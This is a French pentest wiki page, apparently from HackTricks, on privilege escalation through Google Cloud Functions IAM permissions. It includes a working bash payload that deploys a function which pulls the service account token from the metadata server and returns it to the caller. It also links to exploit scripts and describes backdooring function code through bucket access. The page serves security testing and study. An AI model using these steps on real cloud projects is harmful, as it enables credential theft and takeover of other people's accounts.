# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Plus d'informations sur Cloud Functions :

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Un attaquant disposant de ces privilèges peut **créer une nouvelle Cloud Function avec du code arbitraire (malveillant) et lui assigner un Service Account**. Ensuite, leak le Service Account token depuis les metadata pour escalader les privilèges vers celui-ci.\
Certaines permissions pour déclencher la fonction peuvent être requises.

Des scripts d'exploitation pour cette méthode se trouvent [ici](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) et [ici](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) et l'archive .zip préconstruite se trouve [ici](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Un attaquant disposant de ces privilèges peut **modifier le code d'une Function et même modifier le service account attaché** dans le but d'exfiltrating le token.

> [!CAUTION]
> Pour déployer cloud functions vous aurez aussi besoin des permissions actAs sur le default compute service account ou sur le service account utilisé pour construire l'image.

Certaines permissions supplémentaires comme la permission `.call` pour la version 1 de cloudfunctions ou le rôle `role/run.invoker` pour déclencher la fonction peuvent être requises.

<details><summary>Mettre à jour la Cloud Function avec du code malveillant pour exfiltrate service account token</summary>
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
</details>

> [!CAUTION]
> Si vous obtenez l'erreur `Permission 'run.services.setIamPolicy' denied on resource...` c'est parce que vous utilisez le paramètre `--allow-unauthenticated` et que vous n'avez pas les permissions nécessaires.

Le script d'exploitation pour cette méthode se trouve [ici](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Avec cette permission, vous pouvez obtenir une **URL signée permettant d'uploader un fichier dans le bucket de la Cloud Function (mais le code de la fonction ne sera pas modifié, vous devez toujours le mettre à jour)**

<details><summary>Générer une URL d'upload signée pour Cloud Function</summary>
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
</details>

Pas vraiment sûr de l'utilité de cette permission seule du point de vue d'un attaquant, mais bon à savoir.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

Attribuez-vous l'un des privilèges **`.update`** ou **`.create`** précédents pour escalader.

### `cloudfunctions.functions.update`

En n'ayant que les permissions **`cloudfunctions`** et sans **`iam.serviceAccounts.actAs`**, vous **ne pourrez pas mettre à jour la Cloud Function, DONC CECI N'EST PAS UN PRIVESC VALIDE.**

### Accès en lecture et écriture sur le bucket

Si vous avez un accès en lecture et écriture sur le bucket, vous pouvez surveiller les changements dans le code et, dès qu'une mise à jour du bucket se produit, remplacer le nouveau code par le vôtre de sorte que la nouvelle version de la Cloud Function s'exécute avec le backdoored code soumis.

Vous pouvez en savoir plus sur l'attaque dans :

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

Cependant, vous ne pouvez pas utiliser cela pour compromettre à l'avance des Cloud Functions tierces, parce que si vous créez le bucket dans votre compte et lui donnez des permissions publiques afin que le projet externe puisse écrire dessus, vous obtenez l'erreur suivante :

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> Cependant, cela pourrait être utilisé pour des attaques DoS.

### Accès en lecture et écriture sur Artifact Registry

Quand une Cloud Function est créée, une nouvelle docker image est poussée dans l'Artifact Registry du projet. J'ai essayé de modifier l'image par une nouvelle, et même de supprimer l'image courante (et l'image `cache`) mais rien n'a changé : la Cloud Function a continué à fonctionner. Par conséquent, il pourrait peut-être être possible d'abuser d'une Race Condition comme avec le bucket pour remplacer le docker container qui sera exécuté, mais se contenter de modifier l'image stockée ne permet pas de compromettre la Cloud Function.

## Références

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
